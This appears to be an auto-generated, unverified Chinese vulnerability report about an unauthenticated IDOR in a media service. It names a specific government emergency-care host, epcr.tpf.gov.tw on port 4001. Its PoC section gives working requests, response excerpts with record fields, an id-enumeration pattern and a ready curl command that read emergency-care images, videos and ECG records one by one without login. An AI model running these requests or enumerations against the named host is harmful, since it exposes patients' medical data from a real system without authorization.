# POC/EXP — EPCR :4001 /imageData/{id} 与 /videoData/{id} 未授权 IDOR 单条精确读取

> 漏洞ID: `26119b5c-5bbe-47d8-bb8a-603137f50035`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/imageData/{id} 与 /videoData/{id}`

**類型**: IDOR/未授权精确读取

## 描述

EPCR 集群 4001 端口（裸 Node.js/Express 媒体服务，无鉴权中间件）的 /imageData/:id 与 /videoData/:id 端点支持按数字 id 精确查询单条记录，且无需任何认证 token。与 /imageData、/videoData 的批量列表端点不同，此单条端点允许通过遍历 id（1,2,3...）逐条精确读取所有急救影像/影音记录。每条记录含 recordUuid（案件/设备标识）、fileName（含设备 UUID 与时间戳，如 [iPhone][tw.com.viewlead.emtapp<UUID>][<时间>].MP4）、fileId、mimeType、generatedAt（精确到毫秒）、ImageType/VideoType（心電圖/波型/手機上傳）等字段。攻击者可在完全未登录状态下遍历 id 枚举并逐条读取全部急救影音与心电图数据，实现精确的 IDOR 式越权读取。

## POC / 復現步驟

```
GET /imageData/63 → 200 (384B) JSON: {"id":63,"recordUuid":"Test18081709545482","CaseID":null,"fileName":"180817100415c7a0.svg","fileId":124,"mimeType":"image/svg+xml","generatedAt":"2018-08-17T02:06:40.000Z","ImageType":{"id":1,"name":"心電圖",...}}
GET /videoData/63 → 200 (431B) JSON 单条
id 遍历: /imageData/1 → 404 (35B); /imageData/2 → 200 (378B); /imageData/100 → 200 (367B); /imageData/1000 → 200 (414B); /imageData/10000 → 200 (413B)
对照: 4000 的同类 MCi API 均 401 "No authorization token was found"；4001 的 videoData/imageData 批量列表亦 200 无鉴权（已记录 10 万条暴露）
命令: curl -sSk -A "Mozilla/5.0" https://epcr.tpf.gov.tw:4001/imageData/1000
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
